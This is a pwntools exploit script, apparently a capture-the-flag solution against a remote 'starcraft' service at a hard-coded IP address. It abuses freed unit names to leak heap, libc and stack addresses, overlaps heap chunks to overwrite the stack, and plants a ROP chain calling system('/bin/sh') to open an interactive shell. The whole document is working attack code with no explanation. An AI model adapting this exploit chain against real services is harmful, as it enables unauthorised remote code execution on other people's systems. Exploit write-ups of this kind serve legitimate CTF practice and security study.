from pwn import *

#p = process('./starcraft')
p = remote('121.40.56.102', 9776)

def menu():
	p.recvuntil('> ')

def add_unit(name):
	menu()
	p.sendline('1')
	p.recvuntil('Which type of unit do you want to train? ')
	p.sendline('zealot')
	p.recvuntil('Input a name for new unit: ')
	p.sendline(name)

def freeing(index):
	menu()
	p.sendline('4')
	p.sendline('1')
	p.sendline(str(index))
	p.sendline('2')
	p.sendline('4')

def delete(index):
	menu()
	p.sendline('5')
	p.sendline(str(index))

raw_input('wait')

add_unit('0' * (0x20 - 0x1)) # 0
add_unit('1' * (0x20 - 0x1)) # 1
freeing('0') # 0
freeing('1') # 1

menu()
p.sendline('3')
p.sendline('1')
p.recvuntil('Name: ')
leak = p.recvuntil('\n', drop=True)
heap_addr = u64(leak.ljust(8, '\x00'))
print 'heap_addr: %s' % hex(heap_addr)

for i in xrange(14):
	add_unit('Z')

add_unit('A' * (0x20 - 0x1)) # 16
freeing(16) # 16

add_unit('C') # 17
add_unit('D') # 18

'''
now 16's name == 18's unit
'''

freeing(16)
fake = p64(0) * 2
fake += p64(heap_addr + 0x2f8)
fake += 'E' * 0x7
add_unit(fake) # 19

'''
now 19's name == 18's unit
'''

menu()
p.sendline('3')
p.sendline('18')
p.recvuntil('Name: ')
leak = p.recvuntil('\n', drop=True)
leak = u64(leak.ljust(8, '\x00'))
libc_base = leak - 0x3be7b8
print 'libc_base: %s' % hex(libc_base)

freeing(19)
fake = p64(0) * 2
fake += p64(libc_base + 0xb03178)
fake += 'F' * 0x7
add_unit(fake) # 20

'''
now 20's name == 18's unit
'''

menu()
p.sendline('3')
p.sendline('18')
p.recvuntil('Name: ')
leak = p.recvuntil('\n', drop=True)
stack = u64(leak.ljust(8, '\x00'))
print 'stack: %s' % hex(stack)

add_unit('A' * 16) # 21
add_unit('B' * 16) # 22

a_addr = heap_addr + 0x320
b_addr = heap_addr + 0x7a0

freeing(20)
fake = p64(0) * 2
fake += p64(a_addr + 0x10)
fake += 'G' * 0x7
add_unit(fake) # 23

'''
now 23's name == 18's unit
'''

for i in xrange(24, 32):
	add_unit('C' * 16)

# delete(31)
freeing(21)
freeing(22)
freeing(18)
delete(31)
delete(30)
delete(29)
delete(28)

add_unit('A' * 16)
add_unit(p64(stack - 0x158) + 'D' * 0x8)
add_unit('E' * 16)
add_unit('F' * 16)
add_unit(p64(0) + p64(0x60))

delete(27)
delete(26)
delete(25)
add_unit('A' * 0x50) # 30
add_unit('B' * 0x50) # 31
a_addr = heap_addr + 0x600
b_addr = heap_addr + 0xd90
freeing(23)
fake = p64(0) * 2
fake += p64(a_addr + 0x10)
fake += 'F' * 0x7
add_unit(fake)

freeing(30)
freeing(31)
freeing(18)
delete(10)
delete(11)
delete(12)
delete(13)
add_unit(p64(stack- 0x148) + 'A' * (0x50 - 8))
add_unit('A' * 0x50)
add_unit('A' * 0x50)

system = libc_base + 0x46590 #0x45380
binsh = libc_base + 0x17c8c3 #0x18c58b
pop_rdi_ret = libc_base + 0x0012f19c #0x17c8c3 #0x00132c63

rop = '\x00' * 0x38
rop += p64(pop_rdi_ret)
rop += p64(binsh)
rop += p64(system)

add_unit(rop)

raw_input('wait')
menu()
p.sendline('6')

p.interactive()


